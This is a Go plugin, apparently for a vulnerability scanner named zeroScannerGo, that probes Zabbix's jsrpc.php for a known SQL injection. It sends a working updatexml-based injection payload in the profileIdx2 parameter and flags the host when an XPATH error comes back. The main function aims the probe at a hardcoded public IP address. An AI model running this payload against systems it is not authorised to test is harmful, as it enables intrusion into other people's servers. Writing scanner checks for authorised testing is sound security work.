/*
all
*/
package main

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"zeroScannerGo/engine"
	"zeroScannerGo/engine/lib/util"
	"zeroScannerGo/engine/lib/zhttp"
)

var (
	//	InitCookie   = engine.InitCookie //需要使用engine.GetCookie方法则设置这一条，引擎会在外部调用InitCookie方法为engine设置GetCookie方法
	InitDnsCache = zhttp.SetDnsCache //为zhttp设置dns缓存，引擎会在外部调用InitDnsCache方法

	paths   = []string{"/jsrpc.php", "/zabbix/jsrpc.php"}
	payload = "type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
)

func Verify(params engine.Params) (result engine.Result) {
	newPaths := util.GetPaths(paths, params.ParsedTarget.Path)

	params.ParsedTarget.RawQuery = payload

	for _, path := range newPaths {
		if strings.Contains(params.ParsedTarget.String(), "jsrpc.php") {
			params.ParsedTarget.Path = path
			resp, err := zhttp.Get(params.ParsedTarget.String(), &zhttp.RequestOptions{
				DialTimeout:        time.Second * 5,
				RequestTimeout:     time.Second * 5,
				Hosts:              params.Hosts,
				InsecureSkipVerify: true,
				DisableRedirect:    true,
			})
			if err != nil {
				return
			}

			if resp.StatusCode() == 200 && strings.Contains(resp.String(), "XPATH syntax error") {
				resp.Close()
				result.Vul = true
				result.VulUrl = params.ParsedTarget.String()
				result.VulInfo = "zabbix注入"
				return
			}
			resp.Close()
		}
	}
	return
}

func main() {
	params := engine.Params{}
	params.Method = "GET"
	params.Target = "http://46.4.29.145:2080/"
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget

	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
